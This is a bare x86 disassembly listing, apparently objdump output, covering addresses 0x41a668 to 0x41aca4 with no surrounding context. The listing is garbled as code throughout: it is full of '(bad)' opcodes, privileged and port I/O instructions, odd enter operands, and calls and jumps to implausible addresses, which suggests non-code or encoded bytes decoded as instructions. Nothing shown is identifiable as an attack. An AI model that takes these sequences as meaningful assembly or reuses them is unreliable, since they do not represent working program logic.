  41a668:	mov    ebx,DWORD PTR ss:[esp+edx*1+0x1eb808b]
  41a670:	mov    eax,DWORD PTR [eax]
  41a672:	loopne 0x41a6c1
  41a674:	inc    ebp
  41a675:	mov    esi,DWORD PTR [ebx]
  41a677:	mov    eax,DWORD PTR [ebx]
  41a679:	nop
  41a67a:	rol    DWORD PTR [eax],cl
  41a67c:	mov    DWORD PTR [ebx+0x3c4503fc],ecx
  41a682:	mov    cl,BYTE PTR [ecx+0x450bf888]
  41a688:	dec    ebp
  41a689:	push   esi
  41a68a:	mov    edi,DWORD PTR [edi+0x7b608f8]
  41a690:	xor    eax,edi
  41a692:	mov    DWORD PTR [eax+ecx*1-0x74fcb2ce],ebx
  41a699:	mov    DWORD PTR [eax],ecx
  41a69b:	in     al,dx
  41a69c:	into   
  41a69d:	inc    ebp
  41a69e:	iret   
  41a69f:	xor    ecx,edx
  41a6a1:	add    ecx,DWORD PTR [ecx+ecx*4+0x45fff4e0]
  41a6a8:	mov    ecx,DWORD PTR [ebx-0x1735af04]
  41a6ae:	dec    ebp
  41a6af:	mov    DWORD PTR [ebx-0x31ba0b2c],ecx
  41a6b5:	mov    eax,DWORD PTR [eax+edi*1+0x48324d9c]
  41a6bc:	mov    DWORD PTR [ecx+0x8],eax
  41a6bf:	mov    eax,DWORD PTR [ebp-0x8]
  41a6c2:	xor    ebx,DWORD PTR [eax]
  41a6c4:	mov    ecx,0xff8b8d40
  41a6c9:	clc    
  41a6ca:	enter  0x4d49,0x48
  41a6ce:	mov    eax,edx
  41a6d0:	lock enter 0x4545,0x8b
  41a6d5:	mov    esi,eax
  41a6d7:	cmp    dh,al
  41a6d9:	rol    edi,0x3
  41a6dc:	enter  0x9140,0x89
  41a6e0:	inc    ebp
  41a6e1:	adc    al,0x8b
  41a6e3:	inc    ebp
  41a6e4:	clc    
  41a6e5:	xor    eax,esi
  41a6e7:	add    eax,edi
  41a6e9:	mov    DWORD PTR [esi-0x24],ebx
  41a6ec:	rol    DWORD PTR [ebp-0x37],0x33
  41a6f0:	add    al,0x3
  41a6f2:	push   ebp
  41a6f3:	mov    esp,ebp
  41a6f5:	fsubr  st,st(4)
  41a6f7:	inc    ebp
  41a6f8:	(bad)  
  41a6f9:	mov    edi,esp
  41a6fb:	adc    BYTE PTR [ebp+0x30c3f8c7],al
  41a701:	add    DWORD PTR [ebp+edx*2-0x27173877],ebx
  41a708:	inc    ebp
  41a709:	test   DWORD PTR [ecx+0x454514f8],ecx
  41a70f:	xor    cl,BYTE PTR [ebx+0xc7909c]
  41a715:	fmul   DWORD PTR [ebx+0xf81485]
  41a71b:	test   DWORD PTR [ecx+0x8b0100],ecx
  41a721:	cld    
  41a722:	or     edi,eax
  41a724:	dec    eax
  41a725:	ret    
  41a726:	push   ebx
  41a727:	inc    ebp
  41a728:	dec    ebp
  41a729:	mov    ecx,DWORD PTR [ebx+0x5745fc14]
  41a72f:	mov    DWORD PTR [ebp-0x14],edx
  41a732:	push   ecx
  41a733:	jne    0x41a768
  41a735:	mov    edi,DWORD PTR [ebx+0x4d720c]
  41a73b:	call   0xff879903
  41a740:	mov    eax,DWORD PTR [ebp-0x4]
  41a743:	mov    edi,0x4585c3d8
  41a749:	clc    
  41a74a:	mov    eax,DWORD PTR [ebp-0x8]
  41a74d:	xor    eax,DWORD PTR [eax+0x3]
  41a750:	adc    DWORD PTR [eax+0xc],0x45
  41a754:	inc    ebp
  41a755:	push   eax
  41a756:	mov    ebx,ebp
  41a758:	clc    
  41a759:	inc    DWORD PTR [eax-0x75]
  41a75c:	mov    esi,eax
  41a75e:	clc    
  41a75f:	rol    BYTE PTR [ebp+0x4545544e],0x33
  41a766:	je     0x41a76b
  41a768:	mov    edx,DWORD PTR [eax+0x38]
  41a76b:	jne    0x41a7ba
  41a76d:	lea    ecx,[ebx-0x817ab44]
  41a773:	mul    BYTE PTR [ebx]
  41a775:	dec    DWORD PTR [ebx+0x4089f845]
  41a77b:	fadd   DWORD PTR [ebx]
  41a77d:	inc    ebp
  41a77e:	jmp    0x41a70b
  41a780:	mov    ecx,DWORD PTR [esp+edx*2]
  41a783:	rol    DWORD PTR [ebp+0x45],0x8b
  41a787:	mov    edi,esp
  41a789:	lock (bad) 
  41a78b:	dec    ebp
  41a78c:	ret    
  41a78d:	mov    eax,DWORD PTR [ebp+0x10]
  41a790:	mov    eax,DWORD PTR [ecx-0x4]
  41a793:	mov    eax,edi
  41a795:	fadd   st,st(3)
  41a797:	enter  0x1645,0x8b
  41a79b:	inc    ebp
  41a79c:	cld    
  41a79d:	mov    ecx,DWORD PTR [ebp+0xc]
  41a7a0:	xor    ecx,DWORD PTR [ebp+0x3]
  41a7a3:	add    ecx,DWORD PTR [ecx-0x27b276f8]
  41a7a9:	sub    eax,DWORD PTR [ebp-0x17]
  41a7ac:	xor    eax,DWORD PTR [edx]
  41a7ae:	pushf  
  41a7af:	add    bh,al
  41a7b1:	or     al,0xd8
  41a7b3:	jne    0x41a73a
  41a7b5:	(bad)  
  41a7b6:	clc    
  41a7b7:	mov    al,0x45
  41a7b9:	call   0xffde9dfb
  41a7be:	jmp    0xddaaf4
  41a7c3:	mov    DWORD PTR [ebp-0x30],eax
  41a7c6:	xor    eax,DWORD PTR [ebp+0x3]
  41a7c9:	xor    BYTE PTR [ecx+0x45c7f49c],cl
  41a7cf:	enter  0x8503,0xc
  41a7d3:	clc    
  41a7d4:	inc    ebp
  41a7d5:	inc    ebp
  41a7d6:	push   DWORD PTR [edx]
  41a7d8:	in     al,dx
  41a7d9:	pushf  
  41a7da:	jne    0x41a769
  41a7dc:	mov    edx,eax
  41a7de:	clc    
  41a7df:	dec    ebp
  41a7e0:	out    dx,eax
  41a7e1:	(bad)  
  41a7e2:	dec    esp
  41a7e4:	mov    DWORD PTR [ebp-0x10],ecx
  41a7e7:	lea    eax,[ebp-0x38]
  41a7ea:	cmp    DWORD PTR [ebp-0x64],ecx
  41a7ed:	lea    ecx,[ebx-0x38b2273c]
  41a7f3:	mov    eax,ebx
  41a7f5:	cld    
  41a7f6:	(bad)  
  41a7f7:	iret   
  41a7f8:	mov    esp,0xf74de8cb
  41a7fd:	jmp    0x86aa01
  41a802:	test   DWORD PTR [ebx],esi
  41a804:	je     0x41a7a2
  41a806:	mov    ecx,DWORD PTR [edi]
  41a808:	fdivr  st,st(6)
  41a80a:	mov    DWORD PTR [eax],0xe8ff8bc3
  41a810:	lock iret 
  41a812:	inc    ebp
  41a813:	lock push eax
  41a815:	retf   
  41a816:	imul   ecx,DWORD PTR [ebp-0x1],0xecd88b8b
  41a81d:	test   DWORD PTR [ebp-0x7c],0x32d89c8b
  41a824:	dec    ebp
  41a825:	mov    DWORD PTR [ebx],ebp
  41a827:	fmul   DWORD PTR [ecx+0x458bd845]
  41a82d:	fmul   DWORD PTR [ebx+0x40c3f0c7]
  41a833:	enter  0x1303,0xc
  41a837:	inc    ebp
  41a838:	dec    ebp
  41a839:	xor    edi,DWORD PTR [ebx]
  41a83b:	add    esi,DWORD PTR [edx+0x50]
  41a83e:	mov    ecx,DWORD PTR [eax+esi*8]
  41a841:	inc    ebp
  41a842:	inc    eax
  41a843:	push   eax
  41a844:	mov    ebp,esp
  41a846:	lock inc DWORD PTR [ecx-0x75]
  41a84a:	mov    esp,esp
  41a84c:	fadd   DWORD PTR [eax]
  41a84e:	rol    edi,0xee
  41a851:	test   BYTE PTR [eax],al
  41a853:	dec    esp
  41a854:	push   0x32
  41a856:	dec    DWORD PTR [ebx-0x30ba0314]
  41a85c:	push   eax
  41a85d:	mov    dh,0x21
  41a85f:	add    edi,edi
  41a861:	cmp    edi,DWORD PTR [eax-0x7877af1]
  41a867:	add    BYTE PTR [ebp-0x75],al
  41a86a:	(bad)  
  41a86b:	loopne 0x41a839
  41a86d:	add    BYTE PTR [ebp+0x4584f8c7],al
  41a873:	dec    esp
  41a874:	xor    esi,DWORD PTR [edx]
  41a876:	pushf  
  41a877:	mov    eax,edi
  41a879:	cld    
  41a87a:	(bad)  
  41a87b:	iret   
  41a87c:	test   DWORD PTR [esi+0x3b4d03f8],esi
  41a882:	mov    DWORD PTR [edi],ecx
  41a884:	in     al,0x58
  41a886:	dec    ebp
  41a887:	add    BYTE PTR [ecx+0x4df0e08b],cl
  41a88d:	add    BYTE PTR [ecx+0x4d84f0c7],cl
  41a893:	dec    esp
  41a894:	mov    DWORD PTR [edx],esi
  41a896:	fmul   QWORD PTR [ebx-0x30cc03b3]
  41a89c:	add    esi,DWORD PTR [esi+0x3bd80389]
  41a8a2:	test   DWORD PTR [edi],0x3d3800
  41a8a8:	test   DWORD PTR [ebx+0x84dcf8],ecx
  41a8ae:	add    edi,eax
  41a8b0:	add    BYTE PTR [ebp+ecx*2-0x74cdccb4],al
  41a8b7:	mov    eax,DWORD PTR [ebx]
  41a8b9:	cld    
  41a8ba:	mov    edi,ecx
  41a8bc:	hlt    
  41a8bd:	mov    dh,0x45
  41a8bf:	add    esi,DWORD PTR [ebx]
  41a8c1:	cmp    ecx,DWORD PTR [ebp+0x7218300f]
  41a8c7:	add    BYTE PTR [eax],al
  41a8c9:	mov    eax,DWORD PTR [ebp-0x20]
  41a8cc:	mov    eax,DWORD PTR [eax]
  41a8ce:	call   0x33c5f69a
  41a8d3:	dec    esp
  41a8d4:	add    esi,DWORD PTR [edx]
  41a8d6:	cmp    ecx,DWORD PTR [ebx+0x98be475]
  41a8dc:	cld    
  41a8dd:	iret   
  41a8de:	(bad)  
  41a8df:	mov    ebx,es
  41a8e1:	dec    esp
  41a8e2:	push   0x32
  41a8e4:	lea    esi,[edx]
  41a8e6:	mov    al,0x8b
  41a8e8:	call   0xff4ba3dd
  41a8ed:	iret   
  41a8ee:	inc    ebp
  41a8ef:	mov    WORD PTR [ebx-0x75cdccb4],cs
  41a8f5:	or     al,BYTE PTR ds:0xe4728b
  41a8fb:	or     DWORD PTR [ebp-0x31],ecx
  41a8fe:	xor    ecx,DWORD PTR [edi+ecx*1-0x34cd3fb0]
  41a905:	cmp    al,cl
  41a907:	je     0x41aae1
  41a90d:	mov    eax,DWORD PTR [ebp-0x10]
  41a910:	mov    eax,DWORD PTR [eax]
  41a912:	xor    eax,edi
  41a914:	mov    al,BYTE PTR [ebp+eax*1+0x32724c]
  41a91b:	mov    ecx,DWORD PTR [ebp-0x20]
  41a91e:	xor    ecx,DWORD PTR [ecx]
  41a920:	bswap  edi
  41a922:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb4],0x32
  41a92a:	add    DWORD PTR [ebx+0x945dc00],ecx
  41a930:	mov    ecx,edi
  41a932:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054c]
  41a939:	or     al,BYTE PTR [eax]
  41a93b:	mov    ecx,DWORD PTR [ebp-0x20]
  41a93e:	xor    ecx,DWORD PTR [ecx]
  41a940:	bswap  edi
  41a942:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb0],0x3a
  41a94a:	add    DWORD PTR [edi],ecx
  41a94c:	add    BYTE PTR [eax-0x7474ffbb],dl
  41a952:	xor    ebx,esp
  41a954:	mov    al,BYTE PTR [eax]
  41a956:	add    eax,0x8472c7
  41a95b:	dec    esp
  41a95c:	dec    ebp
  41a95d:	xor    dh,BYTE PTR [ebx]
  41a95f:	mov    ecx,DWORD PTR [edi]
  41a961:	lock ror BYTE PTR [ecx],0xcb
  41a965:	iret   
  41a966:	ror    DWORD PTR [esp+eax*4+0x32014c],0x32
  41a96e:	inc    ebp
  41a96f:	mov    ecx,DWORD PTR [ebx-0x75f6cc1c]
  41a975:	iret   
  41a976:	add    eax,0x4c728c
  41a97b:	xor    cl,BYTE PTR [ebp+0xa]
  41a97e:	mov    ecx,DWORD PTR [ebx+0x98af033]
  41a984:	or     eax,0x8c72cf
  41a989:	push   eax
  41a98a:	shl    DWORD PTR [edx],0x4d
  41a98d:	cmp    cl,BYTE PTR [ebx-0x7574cc8b]
  41a993:	fmul   QWORD PTR ds:0xc77200
  41a999:	test   cl,al
  41a99b:	dec    esp
  41a99c:	dec    ebp
  41a99d:	xor    cl,BYTE PTR [ebx-0x751bcc75]
  41a9a3:	or     DWORD PTR ds:0x8c72cf,ecx
  41a9a9:	dec    esp
  41a9aa:	enter  0x8532,0x32
  41a9ae:	add    BYTE PTR [ebx+0x945e000],cl
  41a9b4:	mov    ecx,edi
  41a9b6:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054c]
  41a9bd:	or     al,BYTE PTR [eax]
  41a9bf:	mov    ecx,DWORD PTR [ebp-0x24]
  41a9c2:	mov    ecx,DWORD PTR [ecx]
  41a9c4:	xor    ecx,edi
  41a9c6:	mov    cl,BYTE PTR [ebp+ecx*1+0x327250]
  41a9cd:	cmp    al,cl
  41a9cf:	jne    0x41aa1e
  41a9d1:	lea    ecx,[ebx-0x7517cc50]
  41a9d7:	sti    
  41a9d8:	or     eax,0x4d72ff
  41a9dd:	cmp    eax,ecx
  41a9df:	je     0x41aa2e
  41a9e1:	mov    ecx,DWORD PTR [ebx-0x7538cc04]
  41a9e7:	ret    
  41a9e8:	or     eax,0x8b7245
  41a9ed:	call   0x84c771ba
  41a9f2:	add    BYTE PTR [eax+eax*1-0x74ccbace],bl
  41a9f9:	mov    esi,DWORD PTR [ebx]
  41a9fb:	cld    
  41a9fc:	mov    dl,BYTE PTR [ebp+0x5]
  41a9ff:	xor    esi,DWORD PTR [edx+0x3]
  41aa02:	add    BYTE PTR [ebx],bh
  41aa04:	dec    ebp
  41aa05:	jnp    0x8b40de02
  41aa0b:	mov    ecx,DWORD PTR ds:0x4d72fc
  41aa11:	xor    eax,ecx
  41aa13:	add    ecx,DWORD PTR [ebp+0x3b]
  41aa16:	mov    esi,DWORD PTR [ebp+0x33]
  41aa19:	mov    ecx,DWORD PTR [edx+0x724d0de8]
  41aa1f:	xor    eax,DWORD PTR [eax]
  41aa21:	(bad)  
  41aa22:	ror    DWORD PTR [eax],0x4d
  41aa25:	jb     0x41a9b2
  41aa27:	add    BYTE PTR [ebx],dh
  41aa29:	ja     0x41a9b5
  41aa2b:	sbb    BYTE PTR ds:0x8d7275,cl
  41aa31:	cwde   
  41aa32:	enter  0x50e8,0xf3
  41aa36:	inc    ebp
  41aa37:	dec    DWORD PTR [ebx-0x7574ccbb]
  41aa3d:	fadd   DWORD PTR ds:0xc372c7
  41aa43:	ror    DWORD PTR [ebp+0x13],0x8b
  41aa47:	inc    ebp
  41aa48:	xor    esi,DWORD PTR [ebx]
  41aa4a:	mov    al,BYTE PTR [ebx]
  41aa4c:	or     eax,0x187250
  41aa51:	inc    ebp
  41aa52:	rcl    DWORD PTR [eax+0x4d],0xdc
  41aa56:	mov    edi,edi
  41aa58:	xor    ecx,DWORD PTR [ebx-0x3ff21376]
  41aa5e:	jb     0x41a9e9
  41aa60:	add    ah,bl
  41aa62:	shl    DWORD PTR [ebp+0x4d],0xff
  41aa66:	mov    ebx,esp
  41aa68:	xor    eax,DWORD PTR [ebp-0x76]
  41aa6b:	add    ecx,DWORD PTR ds:0xe87208
  41aa71:	repz enter 0x10ff,0x45
  41aa76:	inc    ebp
  41aa77:	mov    edx,DWORD PTR [eax-0x28]
  41aa7a:	xor    bh,al
  41aa7c:	inc    ebx
  41aa7e:	mov    eax,ecx
  41aa80:	mov    eax,0xa00c111
  41aa85:	jne    0x41aacc
  41aa87:	mov    esi,DWORD PTR [ebx]
  41aa89:	test   al,0x3
  41aa8b:	inc    ebp
  41aa8c:	mov    DWORD PTR [eax-0xc],edx
  41aa8f:	mov    ds:0x8b33ff45,al
  41aa94:	lea    edx,[eax]
  41aa96:	xor    BYTE PTR [ebp+0x72],cl
  41aa99:	add    DWORD PTR [eax],eax
  41aa9b:	mov    eax,edi
  41aa9d:	lods   al,BYTE PTR ds:[esi]
  41aa9e:	dec    ebp
  41aa9f:	inc    ebp
  41aaa0:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  41aaa6:	retf   
  41aaa7:	mov    edx,ecx
  41aaa9:	adc    al,0x84
  41aaab:	(bad)  
  41aaac:	std    
  41aaad:	ret    
  41aaae:	jmp    FWORD PTR [edi-0x37474bb]
  41aab4:	hlt    
  41aab5:	push   ebp
  41aab6:	(bad)  
  41aab7:	xor    eax,ebx
  41aab9:	(bad)  
  41aaba:	enter  0x1111,0x72
  41aabe:	inc    ebp
  41aabf:	add    BYTE PTR [ebx-0x387deb3f],cl
  41aac5:	cld    
  41aac6:	test   bh,bh
  41aac8:	pushf  
  41aac9:	inc    ebp
  41aaca:	xor    bl,BYTE PTR [edi-0x15]
  41aacd:	pop    ebx
  41aace:	push   0xffffffc2
  41aad0:	inc    DWORD PTR [eax]
  41aad2:	in     al,dx
  41aad3:	mov    eax,DWORD PTR [ebp+0x51]
  41aad6:	push   eax
  41aad7:	inc    ebp
  41aad8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aad9:	mov    edi,edi
  41aadb:	or     BYTE PTR [ebx+0x4d80fc16],cl
  41aae1:	add    DWORD PTR [ebx],esi
  41aae3:	add    BYTE PTR [ebx],al
  41aae5:	add    BYTE PTR [ebx],bh
  41aae7:	icebp  
  41aae8:	je     0x41aaf2
  41aaea:	mov    eax,DWORD PTR [edi]
  41aaec:	cld    
  41aaed:	rol    edi,0x72
  41aaf0:	ret    
  41aaf1:	add    BYTE PTR [edx-0x2f],ch
  41aaf4:	lea    edx,[eax]
  41aaf6:	cwde   
  41aaf7:	jne    0x41aae1
  41aaf9:	(bad)  
  41aafa:	clc    
  41aafb:	or     al,0xff
  41aafd:	inc    DWORD PTR [ebp-0x18]
  41ab00:	cmp    ebx,0x18
  41ab03:	inc    DWORD PTR [ebp+0x6]
  41ab06:	call   FWORD PTR [ebp-0x54]
  41ab09:	or     al,0x75
  41ab0b:	push   ebp
  41ab0c:	mov    ebp,esp
  41ab0e:	test   al,0x53
  41ab10:	inc    ebp
  41ab11:	mov    edx,DWORD PTR [eax-0x75]
  41ab14:	imul   ecx,DWORD PTR [eax],0xffffffff
  41ab17:	dec    ebp
  41ab18:	mov    edx,DWORD PTR [edi-0x4]
  41ab1b:	push   ebp
  41ab1c:	dec    ebp
  41ab1d:	push   ecx
  41ab1e:	xor    esi,DWORD PTR [ebx]
  41ab20:	add    edi,DWORD PTR [edi+0x74723b]
  41ab26:	push   0xffffffc7
  41ab28:	inc    DWORD PTR [ecx]
  41ab2a:	lods   al,BYTE PTR ds:[esi]
  41ab2b:	inc    ebp
  41ab2c:	inc    ebp
  41ab2d:	mov    eax,DWORD PTR [ebx]
  41ab2f:	xchg   esp,eax
  41ab30:	or     BYTE PTR [eax],al
  41ab32:	call   0xffcda3c2
  41ab37:	adc    al,0x45
  41ab39:	or     BYTE PTR [ebx+0x800ac01],0x0
  41ab40:	inc    ebp
  41ab41:	inc    ecx
  41ab42:	add    ecx,DWORD PTR [ebx-0x76baebec]
  41ab48:	mov    eax,DWORD PTR [ecx]
  41ab4a:	call   0x338af84f
  41ab4f:	push   0x3
  41ab51:	push   0xc1300f
  41ab56:	dec    ebp
  41ab57:	jo     0x41aae4
  41ab59:	push   0xffffffd4
  41ab5b:	dec    edi
  41ab5d:	mov    DWORD PTR [ebx+ecx*4-0x3ccdf764],ecx
  41ab64:	cmp    eax,edi
  41ab66:	cmovne edx,DWORD PTR [edi-0x75]
  41ab6a:	call   DWORD PTR [eax]
  41ab6c:	mov    eax,DWORD PTR [ebp+0x8]
  41ab6f:	call   FWORD PTR [esi+0x14]
  41ab72:	leave  
  41ab73:	inc    ebp
  41ab74:	adc    BYTE PTR [eax+0x55],dl
  41ab77:	jne    0x41ab65
  41ab79:	call   0xff52ab09
  41ab7e:	dec    ebp
  41ab7f:	inc    ebp
  41ab80:	mov    ecx,DWORD PTR [ebx+0x390338b]
  41ab86:	add    BYTE PTR [ebx],bh
  41ab88:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  41ab8c:	push   ebp
  41ab8d:	or     al,0x51
  41ab8f:	dec    ebp
  41ab90:	xor    DWORD PTR [ebx],0xf32039c
  41ab96:	cmp    eax,DWORD PTR [ebp+0x74]
  41ab99:	mov    edi,edi
  41ab9b:	pop    edi
  41ab9c:	adc    BYTE PTR [ebx+0x75],bl
  41ab9f:	ret    0x50
  41aba2:	mov    ecx,DWORD PTR ss:[edx-0x7d]
  41aba6:	(bad)  
  41aba7:	clc    
  41aba8:	mov    esp,ebp
  41abaa:	pop    ecx
  41abab:	mov    ecx,0xf80085c2
  41abb0:	mov    ecx,DWORD PTR [ecx+edx*2]
  41abb3:	push   esi
  41abb4:	push   esi
  41abb5:	(bad)  
  41abb6:	lock inc DWORD PTR [ebp+0x44]
  41abba:	mov    edx,DWORD PTR [eax]
  41abbc:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  41abc0:	or     BYTE PTR [ebp+0x7],dl
  41abc3:	push   ecx
  41abc4:	ret    
  41abc5:	xor    ebx,DWORD PTR [esi+edi*4+0x37232]
  41abcc:	mov    esi,edi
  41abce:	mov    edi,DWORD PTR [esp+edx*1+0xc]
  41abd2:	cmp    BYTE PTR [ebp+0x1],0x89
  41abd6:	add    BYTE PTR [eax+ecx*1],ah
  41abd9:	cmp    DWORD PTR [ebp+0x10],eax
  41abdc:	mov    edx,DWORD PTR [esi]
  41abde:	xchg   esp,eax
  41abdf:	dec    esp
  41abe0:	add    BYTE PTR [eax],dl
  41abe2:	mov    ecx,edx
  41abe4:	add    edx,DWORD PTR [esp+edi*1+0x8]
  41abe8:	dec    ebp
  41abe9:	into   
  41abea:	mov    ebp,DWORD PTR [edi+0x240089d8]
  41abf0:	mov    edx,DWORD PTR [eax+0x14]
  41abf3:	das    
  41abf4:	add    al,0x45
  41abf6:	add    BYTE PTR [ebp+0x0],dh
  41abf9:	mov    edi,edi
  41abfb:	and    al,0x50
  41abfd:	mov    eax,DWORD PTR [eax]
  41abff:	and    al,0xd1
  41ac01:	xor    eax,DWORD PTR [esi]
  41ac03:	lea    eax,[ebp+0x8]
  41ac06:	xor    esi,DWORD PTR [edx+0x3]
  41ac09:	add    BYTE PTR [ecx+0x4510fc44],cl
  41ac0f:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  41ac15:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  41ac1f:	xor    bh,bh
  41ac21:	pushf  
  41ac22:	mov    edi,edi
  41ac24:	or     BYTE PTR [esi+ecx*1],cl
  41ac27:	jne    0x41abec
  41ac29:	call   0xaabf5
  41ac2e:	adc    BYTE PTR [ebp+eax*2+0xc],al
  41ac32:	mov    ebx,DWORD PTR [eax]
  41ac34:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  41ac38:	mov    DWORD PTR [edi+ebp*4-0x73],0x750110fc
  41ac40:	pop    esi
  41ac41:	dec    ecx
  41ac43:	and    al,0x10
  41ac45:	call   DWORD PTR [ebp+0x24]
  41ac48:	in     al,dx
  41ac49:	call   0xffc5ab32
  41ac4e:	adc    BYTE PTR [ecx+esi*1+0xc],al
  41ac52:	pushf  
  41ac53:	pop    esi
  41ac54:	mov    ebp,esp
  41ac56:	and    al,0xc2
  41ac58:	push   edi
  41ac59:	add    BYTE PTR [ecx+0x33],al
  41ac5c:	mov    DWORD PTR [ebp+0x24],esi
  41ac5f:	test   DWORD PTR [ebx-0x45f7db8b],ecx
  41ac65:	dec    DWORD PTR [eax]
  41ac67:	and    al,0x7
  41ac69:	(bad)  
  41ac6a:	cli    
  41ac6b:	and    al,0x9c
  41ac6d:	or     BYTE PTR [edx],dh
  41ac6f:	sbb    BYTE PTR [ebx],al
  41ac71:	adc    al,0x89
  41ac73:	jmp    DWORD PTR [esp]
  41ac76:	mov    ecx,DWORD PTR [ebx+0x1c7c0c0c]
  41ac7c:	adc    al,0x8
  41ac7e:	dec    ebp
  41ac7f:	adc    BYTE PTR [ebp-0x7c],dh
  41ac82:	mov    esi,DWORD PTR [edx]
  41ac84:	and    al,0x24
  41ac86:	xor    eax,DWORD PTR [ebp-0x63dbf175]
  41ac8c:	add    edi,eax
  41ac8e:	pcmpeqb mm1,mm2
  41ac91:	jmp    0x41acdf
  41ac93:	dec    DWORD PTR [eax]
  41ac95:	je     0x41ac82
  41ac97:	mov    edi,DWORD PTR [ecx]
  41ac99:	pop    ebp
  41ac9a:	adc    BYTE PTR [esp+ecx*2-0x3e],al
  41ac9e:	pushf  
  41ac9f:	mov    DWORD PTR [eax-0x8],ebp
  41aca2:	jge    0x41ad0c
  41aca4:	dec    DWORD PTR [ecx+0x5fbf7424]
